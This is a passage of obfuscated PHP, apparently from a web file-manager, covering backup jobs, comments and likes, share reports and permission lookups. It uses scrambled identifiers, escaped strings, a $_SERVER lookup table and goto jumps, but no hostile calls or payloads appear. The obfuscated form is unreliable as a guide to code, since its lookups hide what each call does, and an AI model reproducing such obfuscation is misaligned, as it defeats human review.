in_array($¾¾ËÏÚÏ[$…Å¹’Œş[33]], array($…Å¹’Œş[90], $…Å¹’Œş[480], $…Å¹’Œş[2073], $…Å¹’Œş[2074], $…Å¹’Œş[2075]))) { $ÖÚöµ½ó[$…Å¹’Œş[33]] = $¾¾ËÏÚÏ[$…Å¹’Œş[33]]; } if (isset($¾¾ËÏÚÏ[$…Å¹’Œş[789]]) && in_array($¾¾ËÏÚÏ[$…Å¹’Œş[789]], array($…Å¹’Œş[214], $…Å¹’Œş[90], $…Å¹’Œş[480], $…Å¹’Œş[2073]))) { $ÖÚöµ½ó[$…Å¹’Œş[789]] = $¾¾ËÏÚÏ[$…Å¹’Œş[789]]; } $ÇÚ¥¼©ä = Input::get($…Å¹’Œş[501], $…Å¹’Œş[7], $…Å¹’Œş[2072], array($…Å¹’Œş[1990], $…Å¹’Œş[495])); $’éöŒçŠ = array($…Å¹’Œş[493] => $…Å¹’Œş[494], $…Å¹’Œş[495] => $…Å¹’Œş[496]); $ÄİÅó°¤ = $…Å¹’Œş[2076] . $’éöŒçŠ[$ÇÚ¥¼©ä]; $ÚÎ­è¤ì = Model($…Å¹’Œş[2068])->where($ÖÚöµ½ó)->order($ÄİÅó°¤)->selectPage(20); if (empty($ÚÎ­è¤ì[$…Å¹’Œş[415]])) { return array(); } $ÅŒ ˜Ã£ = array_to_keyvalue_group($ÚÎ­è¤ì[$…Å¹’Œş[415]], $…Å¹’Œş[789], $…Å¹’Œş[635]); if (!empty($ÅŒ ˜Ã£[0])) { $¾¾ËÏÚÏ = $ÅŒ ˜Ã£[0]; $ÖÚöµ½ó = array($…Å¹’Œş[635] => array($…Å¹’Œş[7], $¾¾ËÏÚÏ)); $®”Á‡Ì = $this->where($ÖÚöµ½ó)->field($…Å¹’Œş[635])->select(); $®”Á‡Ì = array_to_keyvalue($®”Á‡Ì, $…Å¹’Œş[12], $…Å¹’Œş[635]); $µÈÓ­ª÷ = array_diff($¾¾ËÏÚÏ, $®”Á‡Ì); if (!empty($µÈÓ­ª÷)) { foreach ($ÚÎ­è¤ì[$…Å¹’Œş[415]] as $Ü¼Ò°˜á => $ıíâÕ¾) { if (in_array($ıíâÕ¾[$…Å¹’Œş[635]], $µÈÓ­ª÷)) { unset($ÚÎ­è¤ì[$…Å¹’Œş[415]][$Ü¼Ò°˜á]); } } } } $this->_listDataApply($ÚÎ­è¤ì[$…Å¹’Œş[415]]); return $ÚÎ­è¤ì; } public function reportStatus($èÎåÕˆ) { $¶ŸÍ‹‹Ò =& $_SERVER[ò«¥Ê‡å]; $Ö™Ú«¬ = array($¶ŸÍ‹‹Ò[445] => $èÎåÕˆ[$¶ŸÍ‹‹Ò[445]]); $†í²Æ×‘ = Model($¶ŸÍ‹‹Ò[2068])->where($Ö™Ú«¬)->field($¶ŸÍ‹‹Ò[2077])->find(); if (!$†í²Æ×‘) { return !1; } $’¬ùğ»É = array($¶ŸÍ‹‹Ò[789] => $èÎåÕˆ[$¶ŸÍ‹‹Ò[789]]); if ($èÎåÕˆ[$¶ŸÍ‹‹Ò[789]] == $¶ŸÍ‹‹Ò[2073] && $†í²Æ×‘[$¶ŸÍ‹‹Ò[789]] == $¶ŸÍ‹‹Ò[2073]) { $’¬ùğ»É[$¶ŸÍ‹‹Ò[789]] = 0; } $Û¿ê¾Œ = Model($¶ŸÍ‹‹Ò[2068])->where($Ö™Ú«¬)->save($’¬ùğ»É); if ($èÎåÕˆ[$¶ŸÍ‹‹Ò[789]] == $¶ŸÍ‹‹Ò[480]) { if ($†í²Æ×‘[$¶ŸÍ‹‹Ò[511]] != $¶ŸÍ‹‹Ò[214] && $this->shareFileMeta($†í²Æ×‘[$¶ŸÍ‹‹Ò[511]])) { $this->shareFileMeta($†í²Æ×‘[$¶ŸÍ‹‹Ò[511]], 0); } $this->remove($†í²Æ×‘[$¶ŸÍ‹‹Ò[635]]); return !0; } if ($Û¿ê¾Œ && $èÎåÕˆ[$¶ŸÍ‹‹Ò[789]] == $¶ŸÍ‹‹Ò[2073]) { $­Ë× …„ = $’¬ùğ»É[$¶ŸÍ‹‹Ò[789]] == $¶ŸÍ‹‹Ò[2073] ? 1 : 0; $this->shareFileMeta($†í²Æ×‘[$¶ŸÍ‹‹Ò[511]], $­Ë× …„); $this->removeByFile($†í²Æ×‘[$¶ŸÍ‹‹Ò[511]]); } return $Û¿ê¾Œ; } private function removeByFile($÷´«ôåƒ) { $“èô„’¯ =& $_SERVER[ò«¥Ê‡å]; $‘–¯Š‡ = Model($“èô„’¯[871])->where(array($“èô„’¯[511] => $÷´«ôåƒ))->field($“èô„’¯[183])->select(); $ò“‚íâå = array_to_keyvalue($‘–¯Š‡, $“èô„’¯[12], $“èô„’¯[183]); $óñß½Ğƒ = array($“èô„’¯[183] => array($“èô„’¯[7], $ò“‚íâå), $“èô„’¯[533] => 1); $‘–¯Š‡ = $this->where($óñß½Ğƒ)->field($“èô„’¯[635])->select(); if (empty($‘–¯Š‡)) { return; } $ ®‘æŸÓ = array_to_keyvalue($‘–¯Š‡, $“èô„’¯[12], $“èô„’¯[635]); $this->remove($ ®‘æŸÓ); } private function shareFileMeta($Õèƒê¦, $ ãóëà = null) { $ßıûæÉ® =& $_SERVER[ò«¥Ê‡å]; $›º¿‹æÀ = array($ßıûæÉ®[511] => $Õèƒê¦, $ßıûæÉ®[96] => $ßıûæÉ®[2078]); if (is_null($ ãóëà)) { return Model($ßıûæÉ®[2079])->where($›º¿‹æÀ)->find(); } $›º¿‹æÀ[$ßıûæÉ®[420]] = $ ãóëà; Model($ßıûæÉ®[2079])->add($›º¿‹æÀ, array(), !0); } } goto C•ùô —Òà; B×¸ˆ ¥Éó: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\142\141\143\x6b\x75\x70\x4c\151\163\x74"; public $field = array("\x69\x6f", "\156\141\155\145", "\x73\164\141\164\165\163", "\143\x6f\x6e\x74\x65\156\164", "\155\141\156\x75\x61\154", "\x72\x65\163\x75\154\164", "\x74\x69\155\145\x46\162\157\x6d", "\x74\151\x6d\145\124\157"); public function config() { $Š”Ì¶â =& $_SERVER[ò«¥Ê‡å]; $ÆÛÖËª = Model($Š”Ì¶â[809])->get($Š”Ì¶â[819]); $ÆÛÖËª = json_decode($ÆÛÖËª, !0); $ÆÛÖËª = is_array($ÆÛÖËª) ? $ÆÛÖËª : array(); if (!isset($ÆÛÖËª[$Š”Ì¶â[793]])) { $ÆÛÖËª[$Š”Ì¶â[793]] = $Š”Ì¶â[90]; } unset($ÆÛÖËª[$Š”Ì¶â[1671]]); Action($Š”Ì¶â[1924])->taskInit(); Model($Š”Ì¶â[1670])->cacheClear(); $Ìƒˆª‘ƒ = $Š”Ì¶â[1925]; $‰Œ¦ìâ = Model($Š”Ì¶â[1926])->findByKey($Š”Ì¶â[1689], $Ìƒˆª‘ƒ); if (!$‰Œ¦ìâ) { $‰Œ¦ìâ = array(); } if (isset($‰Œ¦ìâ[$Š”Ì¶â[196]])) { $‰Œ¦ìâ[$Š”Ì¶â[196]] = json_decode($‰Œ¦ìâ[$Š”Ì¶â[196]], !0); } if (isset($ÆÛÖËª[$Š”Ì¶â[196]])) { $‰Œ¦ìâ[$Š”Ì¶â[196]][$Š”Ì¶â[1674]] = $ÆÛÖËª[$Š”Ì¶â[196]]; unset($ÆÛÖËª[$Š”Ì¶â[196]]); } return array_merge($‰Œ¦ìâ, $ÆÛÖËª); } public function listData($éÃ¸ªè = false, $ëœƒêÍ = "\155\x6f\144\x69\146\x79\x54\x69\x6d\x65", $¾óÎĞé• = false) { return parent::listData($éÃ¸ªè, $ëœƒêÍ, !0); } public function lastItem() { $ì†í¯Øã = $this->listData(); return !empty($ì†í¯Øã[0]) ? $ì†í¯Øã[0] : null; } public function kill($ğşó—ÀĞ) { $‰Š²å¼æ =& $_SERVER[ò«¥Ê‡å]; $°õ†É—ö = $this->listData($ğşó—ÀĞ); if (!$°õ†É—ö || empty($°õ†É—ö[$‰Š²å¼æ[32]])) { return !0; } Task::kill($‰Š²å¼æ[818]); Task::kill($‰Š²å¼æ[846]); Task::kill($‰Š²å¼æ[855]); $²™ç‘‰Ç = $°õ†É—ö[$‰Š²å¼æ[32]]; $—ÚÑ¯Ì¿ = TEMP_FILES . $‰Š²å¼æ[817] . $²™ç‘‰Ç . $‰Š²å¼æ[8]; IO::remove($—ÚÑ¯Ì¿, !1); return $this->remove($ğşó—ÀĞ); } public function remove($§°Ğš–‡) { $ÓğÏÎŸÄ = $this->listData($§°Ğš–‡); if (!$ÓğÏÎŸÄ) { return !0; } return $this->backupRemove($ÓğÏÎŸÄ); } private function backupRemove($¯û¸¶º¸) { parent::remove($¯û¸¶º¸[$_SERVER[ò«¥Ê‡å][445]]); $ÄŠÅìÔ½ = $this->backupPath($¯û¸¶º¸); IO::remove($ÄŠÅìÔ½, !1); return !0; } private function backupPath($ÄÙŒà÷É) { $¡Â˜ŞŒö =& $_SERVER[ò«¥Ê‡å]; $¹È£„Ö = $ÄÙŒà÷É[$¡Â˜ŞŒö[32]]; $ÁË®Ú¼· = Model($¡Â˜ŞŒö[809])->get($¡Â˜ŞŒö[810]); $ùæ¸ÓÏ¨ = substr(md5($¡Â˜ŞŒö[811] . $ÁË®Ú¼· . $¹È£„Ö), 0, 8); return "\173\x69\x6f\72{$ÄÙŒà÷É[$¡Â˜ŞŒö[790]]}\175\57\x64\141\164\141\x62\x61\163\x65\x2f\x62\141\143\153\x75\160\x2f" . $¹È£„Ö . $¡Â˜ŞŒö[11] . $ùæ¸ÓÏ¨; } public function start() { $²Í³İ¾ö =& $_SERVER[ò«¥Ê‡å]; if ($GLOBALS[$²Í³İ¾ö[6]][$²Í³İ¾ö[91]][$²Í³İ¾ö[1927]] != $²Í³İ¾ö[90]) { return !0; } $ö»Œƒå– = $this->config(); if (!$ö»Œƒå– || $ö»Œƒå–[$²Í³İ¾ö[1671]] != $²Í³İ¾ö[90]) { return !1; } $€½ƒæª = $this->process(); foreach ($€½ƒæª as $«ú¦Œáİ) { if ($«ú¦Œáİ) { return Task::restart($«ú¦Œáİ[$²Í³İ¾ö[445]]); } } $¸ğéú¤ƒ = new Backup(); $ò¬ÔèÉå = $¸ğéú¤ƒ->db(); if ($ò¬ÔèÉå) { $ò¬ÔèÉå = $¸ğéú¤ƒ->dbFile(); if ($ò¬ÔèÉå && $ö»Œƒå–[$²Í³İ¾ö[793]] == $²Í³İ¾ö[214]) { $ò¬ÔèÉå = $¸ğéú¤ƒ->file(); } } Backup::set(array($²Í³İ¾ö[789] => 1, $²Í³İ¾ö[800] => time())); return !0; } public function process() { $Ã»Êæè¹ =& $_SERVER[ò«¥Ê‡å]; $Îë¦™êè = array($Ã»Êæè¹[796] => Task::get($Ã»Êæè¹[818]), $Ã»Êæè¹[801] => Task::get($Ã»Êæè¹[846]), $Ã»Êæè¹[216] => Task::get($Ã»Êæè¹[855])); $·ı±êïª = !1; foreach ($Îë¦™êè as &$“­ª©ŒÊ) { if ($·ı±êïª) { $“­ª©ŒÊ = !1; continue; } if ($“­ª©ŒÊ) { $ÂæÅø™Ö = intval(_get($“­ª©ŒÊ, $Ã»Êæè¹[1706], 0)); if (time() - $ÂæÅø™Ö > 7200) { Task::kill($“­ª©ŒÊ[$Ã»Êæè¹[445]]); $·ı±êïª = !0; $“­ª©ŒÊ = !1; } } } return $Îë¦™êè; } public function restore() { $ß¢ÜéÄ =& $_SERVER[ò«¥Ê‡å]; ActionCall($ß¢ÜéÄ[1107], !0, 1); ActionCall($ß¢ÜéÄ[1107], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\156\164"; protected $tableMeta = array("\x74\141\x62\x6c\x65\116\141\155\145" => "\x63\157\x6d\155\145\156\x74\137\155\145\x74\141", "\155\145\x74\141\106\x69\145\154\x64" => "\x63\157\155\155\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¡Ì–îöÛ) { $¥öíì›¨ =& $_SERVER[ò«¥Ê‡å]; if ($¡Ì–îöÛ[$¥öíì›¨[1928]]) { $¿àèÛ–“ = $this->where(array($¥öíì›¨[1929] => $¡Ì–îöÛ[$¥öíì›¨[1928]]))->find(); if (!$¿àèÛ–“ || $¿àèÛ–“[$¥öíì›¨[180]] != $¡Ì–îöÛ[$¥öíì›¨[180]] || $¿àèÛ–“[$¥öíì›¨[540]] != $¡Ì–îöÛ[$¥öíì›¨[540]]) { return !1; } $this->where(array($¥öíì›¨[1929] => $¡Ì–îöÛ[$¥öíì›¨[1928]]))->setAdd($¥öíì›¨[1930], 1); } $¡Ì–îöÛ[$¥öíì›¨[1931]] = 0; $¡Ì–îöÛ[$¥öíì›¨[1930]] = 0; $¡Ì–îöÛ[$¥öíì›¨[789]] = 1; return $this->add($¡Ì–îöÛ); } public function commentCount($ßÖ§ôóõ, $ ¼Ù®–Ÿ, $ÍĞ¡ù†Î = false) { $ãÙ×†Ä­ =& $_SERVER[ò«¥Ê‡å]; if (!$ßÖ§ôóõ) { return array(); } if (is_string($ßÖ§ôóõ) || is_int($ßÖ§ôóõ)) { $ßÖ§ôóõ = array($ßÖ§ôóõ); } $´Ì¤­Ìó = array($ãÙ×†Ä­[540], $ãÙ×†Ä­[1932] => $ãÙ×†Ä­[536]); $øÚÊ‘î = array($ãÙ×†Ä­[540] => array($ãÙ×†Ä­[7], $ßÖ§ôóõ), $ãÙ×†Ä­[180] => $ ¼Ù®–Ÿ); if ($ÍĞ¡ù†Î) { $øÚÊ‘î[$ãÙ×†Ä­[1701]] = $ÍĞ¡ù†Î; } $¹şÑê = $this->field($´Ì¤­Ìó)->where($øÚÊ‘î)->group($ãÙ×†Ä­[540])->select(); return array_to_keyvalue($¹şÑê, $ãÙ×†Ä­[540], $ãÙ×†Ä­[536]); } public function starTarget($ÀµéÀµÒ, $Õà‡–¤) { $ì×èÖš¦ =& $_SERVER[ò«¥Ê‡å]; $øå¸öàÜ = $ÀµéÀµÒ + self::TYPE_STAR_OFFSET; $Ù—ò€«³ = array($ì×èÖš¦[1701] => USER_ID, $ì×èÖš¦[180] => $øå¸öàÜ, $ì×èÖš¦[540] => $Õà‡–¤); $¶ïºú½ô = $this->where($Ù—ò€«³)->find(); if ($¶ïºú½ô) { return $this->where(array($ì×èÖš¦[445] => $¶ïºú½ô[$ì×èÖš¦[445]]))->delete(); } $ãûë¼•› = array($ì×èÖš¦[1928] => 0, $ì×èÖš¦[1701] => USER_ID, $ì×èÖš¦[789] => 1, $ì×èÖš¦[793] => $ì×èÖš¦[12], $ì×èÖš¦[180] => $øå¸öàÜ, $ì×èÖš¦[540] => $Õà‡–¤, $ì×èÖš¦[1931] => 0, $ì×èÖš¦[1930] => 0); return $this->add($ãûë¼•›); } public function starTargetCount($â¶ô«ª, $Úô›¯­) { $àÈşÈªİ =& $_SERVER[ò«¥Ê‡å]; $øÑìÉİß = $Úô›¯­ + self::TYPE_STAR_OFFSET; $éé‡¬ø© = $this->commentCount($â¶ô«ª, $øÑìÉİß); $Ä©ìÙ”µ = $this->commentCount($â¶ô«ª, $øÑìÉİß, USER_ID); return array($àÈşÈªİ[1933] => $éé‡¬ø©, $àÈşÈªİ[1934] => $Ä©ìÙ”µ); } public function starTargetUserList($ÅŒåóò, $Ñáõ») { $Æ–¾ø°ğ =& $_SERVER[ò«¥Ê‡å]; $¬ö’ªù = $ÅŒåóò + self::TYPE_STAR_OFFSET; $˜†Öù« = array($Æ–¾ø°ğ[540] => $Ñáõ», $Æ–¾ø°ğ[180] => $¬ö’ªù); $…Ş»á÷Ø = $this->where($˜†Öù«)->count(); $¤„İñØÁ = array($Æ–¾ø°ğ[301] => $…Ş»á÷Ø, $Æ–¾ø°ğ[1935] => array()); if (!$…Ş»á÷Ø) { return $¤„İñØÁ; } $Õ¤¨›½ = $this->field($Æ–¾ø°ğ[1701])->where($˜†Öù«)->limit(500)->select(); $Õ¤¨›½ = array_to_keyvalue($Õ¤¨›½, $Æ–¾ø°ğ[12], $Æ–¾ø°ğ[1701]); $¤„İñØÁ[$Æ–¾ø°ğ[1935]] = Model($Æ–¾ø°ğ[548])->userListInfo($Õ¤¨›½); return $¤„İñØÁ; } public function prasiseUserList($£ãòø°Ú) { $àÒ±¹© =& $_SERVER[ò«¥Ê‡å]; $éçÔÙ›˜ = array($àÒ±¹©[1936] => $£ãòø°Ú); $©úÕ¿çğ = $this->where($éçÔÙ›˜)->find(); $¹Ö¦²¬© = _get($©úÕ¿çğ, $àÒ±¹©[1931], 0); $ùÍà‡ı = array($àÒ±¹©[301] => $¹Ö¦²¬©, $àÒ±¹©[1935] => array()); if (!$¹Ö¦²¬©) { return $ùÍà‡ı; } $‰‘˜ÁšÃ = Model($àÒ±¹©[1937])->field($àÒ±¹©[1701])->where($éçÔÙ›˜)->limit(500)->select(); $‰‘˜ÁšÃ = array_to_keyvalue($‰‘˜ÁšÃ, $àÒ±¹©[12], $àÒ±¹©[1701]); $ùÍà‡ı[$àÒ±¹©[1935]] = Model($àÒ±¹©[548])->userListInfo($‰‘˜ÁšÃ); return $ùÍà‡ı; } public function remove($ß”¡ß’) { $ÖÍ´¥æ =& $_SERVER[ò«¥Ê‡å]; $áŒƒ”¯ = array($ÖÍ´¥æ[1929] => $ß”¡ß’); $¡ØÔ¬˜Š = $this->where($áŒƒ”¯)->find(); if ($¡ØÔ¬˜Š[$ÖÍ´¥æ[1928]]) { $this->where(array($ÖÍ´¥æ[1929] => $¡ØÔ¬˜Š[$ÖÍ´¥æ[1928]]))->setAdd($ÖÍ´¥æ[1930], -1); } return $this->where($áŒƒ”¯)->delete(); } public function edit($¬üÉÍÕÙ, $¦Ôà—³ã) { $İœÔ‚ß“ =& $_SERVER[ò«¥Ê‡å]; $‡‰°‹ = array($İœÔ‚ß“[1929] => $¬üÉÍÕÙ); return $this->where($‡‰°‹)->save(array($İœÔ‚ß“[1938] => $¦Ôà—³ã)); } public function prasise($œ¨ÆÈš) { $àĞÆü¥„ =& $_SERVER[ò«¥Ê‡å]; $í©æ¢ã = Model($àĞÆü¥„[1939]); $ûò¾™Áç = array($àĞÆü¥„[1929] => $œ¨ÆÈš, $àĞÆü¥„[1692] => USER_ID); $âÇ®² = $í©æ¢ã->where($ûò¾™Áç)->find(); if (!$âÇ®²) { $í©æ¢ã->add($ûò¾™Áç); $Ë‹—Í¡® = $this->where(array($àĞÆü¥„[1929] => $œ¨ÆÈš))->setAdd($àĞÆü¥„[1931], 1); } else { $í©æ¢ã->where($ûò¾™Áç)->delete(); $Ë‹—Í¡® = $this->where(array($àĞÆü¥„[1929] => $œ¨ÆÈš))->setAdd($àĞÆü¥„[1931], -1); } return $Ë‹—Í¡®; } public function targetInfo($‰Ü¢„Ü, $Êæ©Ê¦) { $›¨—Ííœ =& $_SERVER[ò«¥Ê‡å]; $íùÙáÑÒ = array($›¨—Ííœ[618] => $‰Ü¢„Ü, $›¨—Ííœ[619] => $Êæ©Ê¦); $Ûç¾¬ÌØ = $this->where($íùÙáÑÒ)->count(); $ÜóÊì±ù = "\122\x49\107\110\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\143\x6f\155\155\x65\x6e\x74\137\160\162\141\151\163\145\x20\163\164\x61\x72\40\x6f\x6e\x20\x63\157\155\x6d\145\156\x74\x2e\143\x6f\x6d\155\x65\x6e\164\x49\x44\40\75\40\163\164\141\162\56\143\x6f\x6d\x6d\x65\x6e\x74\111\104"; $İ›ñ’ = $this->alias($›¨—Ííœ[400])->where($íùÙáÑÒ)->join($ÜóÊì±ù, $›¨—Ííœ[1940])->count(); $––ÉÒˆİ = array($›¨—Ííœ[1941] => $Ûç¾¬ÌØ, $›¨—Ííœ[1942] => $İ›ñ’); return $––ÉÒˆİ; } public function listData($†ĞúÇÜ©) { $˜˜µõ˜Ÿ =& $_SERVER[ò«¥Ê‡å]; if (isset($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1943]])) { if ($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1943]]) { $†ĞúÇÜ©[$˜˜µõ˜Ÿ[1936]] = array($˜˜µõ˜Ÿ[1061], intval($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1943]])); } unset($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1943]]); } if (isset($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1944]])) { if ($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1944]]) { $†ĞúÇÜ©[$˜˜µõ˜Ÿ[1936]] = array($˜˜µõ˜Ÿ[1058], intval($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1944]])); } unset($†ĞúÇÜ©[$˜˜µõ˜Ÿ[1944]]); } return $this->_listData($†ĞúÇÜ©); } private function _listData($¨®æåµ) { $‹úî»ƒ­ =& $_SERVER[ò«¥Ê‡å]; $Î”é‘©º = $this->where($¨®æåµ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Î”é‘©º[$‹úî»ƒ­[415]]); $this->_listAppendUser($Î”é‘©º[$‹úî»ƒ­[415]]); $this->_listAppendMeta($Î”é‘©º[$‹úî»ƒ­[415]]); return $Î”é‘©º; } private function _makeOrder() { $€¿ú¬ü =& $_SERVER[ò«¥Ê‡å]; $éáŞğ›» = array($€¿ú¬ü[1931], $€¿ú¬ü[1930], $€¿ú¬ü[217]); $”éíÉ® = Input::get($€¿ú¬ü[500], $€¿ú¬ü[7], $€¿ú¬ü[467], $éáŞğ›»); $ô“ñÆ ‡ = Input::get($€¿ú¬ü[501], $€¿ú¬ü[7], $€¿ú¬ü[1694], array($€¿ú¬ü[1945], $€¿ú¬ü[496])); $İºÖŠÕ = $”éíÉ® . $€¿ú¬ü[53] . $ô“ñÆ ‡; return $this->order($İºÖŠÕ); } private function _listAppendParent(&$¿ÅØ³¬£) { $â™¤„‹ =& $_SERVER[ò«¥Ê‡å]; $õ º†Ü = array_unique(array_to_keyvalue($¿ÅØ³¬£, $â™¤„‹[12], $â™¤„‹[1928])); $õ º†Ü = array_remove_value($õ º†Ü, $â™¤„‹[214]); if (!$õ º†Ü) { return; } $‘£®ƒ»” = $this->where(array($â™¤„‹[1929] => array($â™¤„‹[7], $õ º†Ü)))->select(); $‘£®ƒ»” = array_to_keyvalue($‘£®ƒ»”, $â™¤„‹[1936]); foreach ($¿ÅØ³¬£ as &$ÜÙ¿Ë¯¥) { if (isset($‘£®ƒ»”[$ÜÙ¿Ë¯¥[$â™¤„‹[1928]]])) { $ÜÙ¿Ë¯¥[$â™¤„‹[1946]] = $‘£®ƒ»”[$ÜÙ¿Ë¯¥[$â™¤„‹[1928]]]; } } unset($ÜÙ¿Ë¯¥); } private function _listAppendUser(&$ÃÄ–ˆè) { $ßŞ·÷¯Á =& $_SERVER[ò«¥Ê‡å]; $ô«ôÏµ = array_unique(array_to_keyvalue($ÃÄ–ˆè, $ßŞ·÷¯Á[12], $ßŞ·÷¯Á[1701])); $ô«ôÏµ = array_remove_value($ô«ôÏµ, $ßŞ·÷¯Á[214]); if (count($ô«ôÏµ) == 0) { return; } foreach ($ÃÄ–ˆè as $²´ÈíúÏ) { if (isset($²´ÈíúÏ[$ßŞ·÷¯Á[1946]])) { $ô«ôÏµ[] = $²´ÈíúÏ[$ßŞ·÷¯Á[1946]][$ßŞ·÷¯Á[1701]]; } } $öÑóŸ÷ã = Model($ßŞ·÷¯Á[569])->userListInfo($ô«ôÏµ); foreach ($ÃÄ–ˆè as &$²´ÈíúÏ) { $²´ÈíúÏ[$ßŞ·÷¯Á[632]] = $öÑóŸ÷ã[$²´ÈíúÏ[$ßŞ·÷¯Á[1701]]]; if (isset($²´ÈíúÏ[$ßŞ·÷¯Á[1946]])) { $²´ÈíúÏ[$ßŞ·÷¯Á[1946]][$ßŞ·÷¯Á[632]] = $öÑóŸ÷ã[$²´ÈíúÏ[$ßŞ·÷¯Á[1946]][$ßŞ·÷¯Á[1701]]]; } } unset($²´ÈíúÏ); } private function _listAppendMeta(&$»ŸÌ¼Áß) { $Ø×àñ¡ =& $_SERVER[ò«¥Ê‡å]; $õøÊ¾ç£ = array_unique(array_to_keyvalue($»ŸÌ¼Áß, $Ø×àñ¡[12], $Ø×àñ¡[1936])); $õøÊ¾ç£ = array_remove_value($õøÊ¾ç£, $Ø×àñ¡[214]); if (!$õøÊ¾ç£) { return; } foreach ($»ŸÌ¼Áß as $–À¼ÖÛ¿) { if (isset($–À¼ÖÛ¿[$Ø×àñ¡[1946]])) { $õøÊ¾ç£[] = $–À¼ÖÛ¿[$Ø×àñ¡[1946]][$Ø×àñ¡[1936]]; } } $¨Û„±üŒ = $this->metaList($õøÊ¾ç£); if (!$¨Û„±üŒ) { return !1; } foreach ($»ŸÌ¼Áß as &$–À¼ÖÛ¿) { $–À¼ÖÛ¿[$Ø×àñ¡[509]] = $¨Û„±üŒ[$–À¼ÖÛ¿[$Ø×àñ¡[1936]]]; if (isset($–À¼ÖÛ¿[$Ø×àñ¡[1946]])) { $–À¼ÖÛ¿[$Ø×àñ¡[1946]][$Ø×àñ¡[509]] = $¨Û„±üŒ[$–À¼ÖÛ¿[$Ø×àñ¡[1946]][$Ø×àñ¡[1936]]]; } } unset($–À¼ÖÛ¿); } private function metaList($åëëùïş) { $™´ÑŞè =& $_SERVER[ò«¥Ê‡å]; if (!$åëëùïş) { return array(); } $é‘‘ÃíÁ = array($™´ÑŞè[1936] => array($™´ÑŞè[7], $åëëùïş)); $‹ëÆÊñé = Model($™´ÑŞè[1947])->where($é‘‘ÃíÁ)->select(); $‹ëÆÊñé = array_to_keyvalue_group($‹ëÆÊñé, $™´ÑŞè[1936]); foreach ($‹ëÆÊñé as $ˆÎŞˆù => $Ëè‹¼é) { $‰÷Ÿ¼òñ = array(); foreach ($Ëè‹¼é as $‡œ‚€æ) { $‰÷Ÿ¼òñ[$‡œ‚€æ[$™´ÑŞè[96]]] = $‡œ‚€æ[$™´ÑŞè[420]]; } $‹ëÆÊñé[$ˆÎŞˆù] = $‰÷Ÿ¼òñ; } return $‹ëÆÊñé ? $‹ëÆÊñé : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145\137\143\x6f\x6e\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\x69\155\x65", "\164\151\155\145", "\x69\156\163\x65\162\164", "\x66\165\x6e\143\x74\x69\157\x6e")); } goto fÔßô¯İÀ·; C•ùô —Òà: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\145\x5f\x61\x75\x74\150"; public function getAuth($ãÎĞ†·ë) { $¯·È³²Ù =& $_SERVER[ò«¥Ê‡å]; $åÄçÖ”Å = $this->sourceAuthSelect($ãÎĞ†·ë); $‡öùÁ— = array(); $¹şÈ¿„µ = array(); $Ò½«êë” = 2 << 25; foreach ($åÄçÖ”Å as $…¸˜µõË) { $„¾Ö÷‘Ö = Model($¯·È³²Ù[542])->listData($…¸˜µõË[$¯·È³²Ù[2003]]); if (!$„¾Ö÷‘Ö) { continue; } $‡öùÁ—[] = $…¸˜µõË; $¯–­ƒÇõ = 0; if ($…¸˜µõË[$¯·È³²Ù[180]] == SourceModel::TYPE_GROUP) { $¯–­ƒÇõ = $Ò½«êë” * 2; } if ($…¸˜µõË[$¯·È³²Ù[180]] == SourceModel::TYPE_USER) { $¯–­ƒÇõ = $Ò½«êë”; } if ($…¸˜µõË[$¯·È³²Ù[180]] == SourceModel::TYPE_USER && $…¸˜µõË[$¯·È³²Ù[540]] == $¯·È³²Ù[214]) { $¯–­ƒÇõ = 0; } $¹şÈ¿„µ[] = $„¾Ö÷‘Ö[$¯·È³²Ù[457]] + $¯–­ƒÇõ; } array_multisort($¹şÈ¿„µ, SORT_DESC, $‡öùÁ—); return $‡öùÁ—; } public function sourceAuthSelect($Êµºã¦¨) { $€¨¯î² =& $_SERVER[ò«¥Ê‡å]; static $­³ìÛ¿ = array(); $¶Äœ½… = is_array($Êµºã¦¨) ? !1 : !0; if ($¶Äœ½…) { $Êµºã¦¨ = array($Êµºã¦¨); } $ÅØåŞ¬ = array(); foreach ($Êµºã¦¨ as $îâ±ş) { if (isset($­³ìÛ¿[$îâ±ş])) { $ÅØåŞ¬[$îâ±ş] = $­³ìÛ¿[$îâ±ş]; } } if (count($ÅØåŞ¬) == count($Êµºã¦¨)) { return $¶Äœ½… ? $ÅØåŞ¬[$Êµºã¦¨[0]] : $ÅØåŞ¬; } $‡ªÊŸ©ú = $€¨¯î²[2080]; $ò¿ù´ˆî = array($€¨¯î²[183] => array($€¨¯î²[7], $Êµºã¦¨)); $­·îˆÉ¿ = $this->field($‡ªÊŸ©ú)->order($€¨¯î²[445])->where($ò¿ù´ˆî)->select(); $ğ¾´Šâã = array_to_keyvalue_group($­·îˆÉ¿, $€¨¯î²[183]); foreach ($Êµºã¦¨ as $îâ±ş) { $­³ìÛ¿[$îâ±ş] = $ğ¾´Šâã[$îâ±ş] ? $ğ¾´Šâã[$îâ±ş] : array(); } if ($¶Äœ½…) { return $­·îˆÉ¿; } return $ğ¾´Šâã; } public function setAuth($Êë½¤ÑÇ, $›£¨šğ¸) { $ØÅ‡§¦· =& $_SERVER[ò«¥Ê‡å]; $™«¦ÚÈ¤ = Model($ØÅ‡§¦·[1380])->sourceInfo($Êë½¤ÑÇ); if (!$™«¦ÚÈ¤) { return !1; } if ($™«¦ÚÈ¤[$ØÅ‡§¦·[180]] != SourceModel::TYPE_GROUP) 